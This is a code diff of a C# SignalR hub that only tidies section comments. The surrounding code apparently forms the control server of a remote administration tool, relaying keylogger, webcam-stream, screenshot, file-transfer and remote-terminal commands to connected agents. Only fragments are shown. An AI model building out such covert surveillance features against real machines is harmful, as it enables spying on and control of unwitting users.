@@ -117,7 +117,7 @@ namespace WebApp.Hubs
             await Clients.Client(targetConnectionId).SendAsync("KillProcessCommand", processId);
         }
 
-        // --- NEW: Applications Management ---
+        // Applications Management
         public async Task RequestApplications(string targetConnectionId)
         {
             var adminId = Context.ConnectionId;
@@ -137,7 +137,7 @@ namespace WebApp.Hubs
             await Clients.Client(targetConnectionId).SendAsync("StartAppCommand", appPath);
         }
 
-        // --- NEW: Power Management ---
+        // Power Management
         public async Task ShutdownDevice(string targetConnectionId)
         {
             await Clients.Client(targetConnectionId).SendAsync("ShutdownCommand");
@@ -148,7 +148,7 @@ namespace WebApp.Hubs
             await Clients.Client(targetConnectionId).SendAsync("RestartCommand");
         }
 
-        // --- NEW: Screen Capture ---
+        // Screen Capture
         public async Task RequestScreenshot(string targetConnectionId)
         {
             var adminId = Context.ConnectionId;
@@ -164,7 +164,7 @@ namespace WebApp.Hubs
             }
         }
 
-        // --- NEW: File Manager ---
+        // File Manager
         public async Task RequestDirectoryContents(string targetConnectionId, string path)
         {
             var adminId = Context.ConnectionId;
@@ -198,7 +198,7 @@ namespace WebApp.Hubs
             await Clients.Client(targetConnectionId).SendAsync("ReceiveFileUploadCommand", dirPath, fileName, base64Data);
         }
 
-        // --- NEW: Webcam Stream ---
+        // Webcam Stream
         public async Task RequestWebcams(string targetConnectionId)
         {
             var adminId = Context.ConnectionId;
@@ -243,7 +243,7 @@ namespace WebApp.Hubs
             }
         }
 
-        // --- NEW: Keylogger ---
+        // Keylogger
         public async Task RequestStartKeylogger(string targetConnectionId)
         {
             if (ConnectedAgents.TryGetValue(targetConnectionId, out var info))
@@ -274,7 +274,7 @@ namespace WebApp.Hubs
             }
         }
 
-        // --- NEW: Terminal ---
+        // Terminal
         public async Task RequestExecuteCommand(string targetConnectionId, string command)
         {
             var adminId = Context.ConnectionId;
